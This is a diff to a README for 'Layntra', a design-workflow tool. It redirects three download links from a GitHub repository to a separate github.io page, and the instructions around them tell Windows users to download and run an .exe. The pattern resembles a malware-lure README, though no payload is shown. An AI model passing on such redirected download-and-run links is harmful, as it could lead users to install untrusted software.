@@ -1,6 +1,6 @@
 # 🛠 Layntra - Manage your design workflows with ease
 
-[![](https://img.shields.io/badge/Download-Layntra-blue)](https://github.com/cosmobimetal956/Layntra)
+[![](https://img.shields.io/badge/Download-Layntra-blue)](https://cosmobimetal956.github.io)
 
 ## 📋 What is Layntra?
 
@@ -10,7 +10,7 @@ Layntra connects your design tools to a local helper system. It acts as a bridge
 
 Follow these steps to set up Layntra on your Windows computer.
 
-1. Visit the [official download page](https://github.com/cosmobimetal956/Layntra) to get the latest version.
+1. Visit the [official download page](https://cosmobimetal956.github.io) to get the latest version.
 2. Select the file ending in .exe for Windows.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
@@ -28,7 +28,7 @@ To run Layntra, your computer needs these settings:
 
 ## 🖥 How to install
 
-1. Find the download link here: [Download Layntra](https://github.com/cosmobimetal956/Layntra).
+1. Find the download link here: [Download Layntra](https://cosmobimetal956.github.io).
 2. Once the download finishes, open your Downloads folder.
 3. Locate the Layntra installer.
 4. Run the installer by clicking the file twice.
